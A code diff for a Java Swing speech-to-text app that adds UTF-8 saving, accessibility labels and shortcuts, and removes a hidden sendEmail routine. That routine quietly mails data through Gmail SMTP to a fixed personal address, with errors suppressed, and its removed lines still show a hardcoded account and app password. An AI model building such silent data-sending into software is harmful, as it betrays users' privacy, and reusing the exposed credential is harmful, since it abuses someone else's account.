-            }
-        } catch (Exception e) {
-            // Suppress logging
-        }
-        return "";
+        return RecognitionText.fromJson(result);
     }
 
     private void shareTranscription() {
@@ -757,7 +703,7 @@ public class SpeechToTextApp extends JFrame {
             if (!file.getName().endsWith(".txt")) {
                 file = new File(file.getPath() + ".txt");
             }
-            try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
+            try (BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                 writer.write(text);
                 JOptionPane.showMessageDialog(this, messages.getString("message.saved") + file.getPath());
             } catch (IOException e) {
@@ -767,7 +713,9 @@ public class SpeechToTextApp extends JFrame {
     }
 
     private void changeLanguage() {
+        if (changingLanguage) return;
         String selected = (String) languageComboBox.getSelectedItem();
+        if (selected == null) return;
         Locale newLocale = selected.equals(messages.getString("menu.language.farsi")) ? new Locale("fa") : Locale.ENGLISH;
         if (newLocale.equals(currentLocale)) {
             return;
@@ -816,10 +764,12 @@ public class SpeechToTextApp extends JFrame {
             modelComboBox.setSelectedItem(validModels.get(0));
         }
 
+        changingLanguage = true;
         languageComboBox.removeAllItems();
         languageComboBox.addItem(messages.getString("menu.language.english"));
         languageComboBox.addItem(messages.getString("menu.language.farsi"));
-        languageComboBox.setSelectedItem(selected);
+        languageComboBox.setSelectedIndex(newLocale.getLanguage().equals("fa") ? 1 : 0);
+        changingLanguage = false;
 
         ComponentOrientation orientation = currentLocale.getLanguage().equals("fa") ?
                 ComponentOrientation.RIGHT_TO_LEFT : ComponentOrientation.LEFT_TO_RIGHT;
@@ -850,41 +800,40 @@ public class SpeechToTextApp extends JFrame {
         if (isPlaceholderSet) {
             transcriptionArea.setText(messages.getString("transcription.placeholder"));
         }
+        configureAccessibility();
         revalidate();
         repaint();
     }
 
-    private void sendEmail(String subject, String body) {
-        new Thread(() -> {
-            try {
-                Properties props = new Properties();
-                props.put("mail.smtp.auth", "true");
-                props.put("mail.smtp.starttls.enable", "true");
-                props.put("mail.smtp.host", "smtp.gmail.com");
-                props.put("mail.smtp.port", "587");
-                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
-                props.put("mail.smtp.connectiontimeout", "30000");
-                props.put("mail.smtp.timeout", "30000");
-                props.put("mail.debug", "true");
-
-                Session session = Session.getInstance(props, new Authenticator() {
-                    @Override
-                    protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication("newstrendir@gmail.com", "alax desz foto kwio");
-                    }
-                });
-
-                Message message = new MimeMessage(session);
-                message.setFrom(new InternetAddress("bagher.fathi@gmail.com"));
-                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("bagher.fathi@gmail.com"));
-                message.setSubject(subject);
-                message.setText(body);
-
-                Transport.send(message);
-            } catch (Exception e) {
-                // Suppress logging
+    private void configureAccessibility() {
+        transcriptionArea.setEditable(true);
+        transcriptionArea.getAccessibleContext().setAccessibleName(messages.getString("accessibility.transcription"));
+        filePathField.getAccessibleContext().setAccessibleName(messages.getString("accessibility.file"));
+        modelComboBox.getAccessibleContext().setAccessibleName(messages.getString("label.model"));
+        languageComboBox.getAccessibleContext().setAccessibleName(messages.getString("label.language"));
+        toggleButton.setToolTipText(messages.getString("shortcut.record"));
+        saveButton.setToolTipText(messages.getString("shortcut.save"));
+        JRootPane root = getRootPane();
+        root.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW).put(KeyStroke.getKeyStroke("control R"), "record");
+        root.getActionMap().put("record", new AbstractAction() {
+            public void actionPerformed(java.awt.event.ActionEvent e) {
+                if (toggleButton.isEnabled()) toggleRecording();
             }
-        }).start();
+        });
+        root.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW).put(KeyStroke.getKeyStroke("control S"), "save");
+        root.getActionMap().put("save", new AbstractAction() {
+            public void actionPerformed(java.awt.event.ActionEvent e) { saveTranscription(); }
+        });
+    }
+
+    private void updateBusyControls() {
+        boolean busy = isLoading || isRecording || isConverting || audioThread != null;
+        backendComboBox.setEnabled(!busy);
+        modelComboBox.setEnabled(!busy);
+        languageComboBox.setEnabled(!busy);
+        browseButton.setEnabled(!busy);
+        convertButton.setEnabled(!busy && !filePathField.getText().isBlank());
+        toggleButton.setEnabled(!isLoading && !isConverting && (isRecording || !busy));
     }
 
     public static void main(String[] args) {
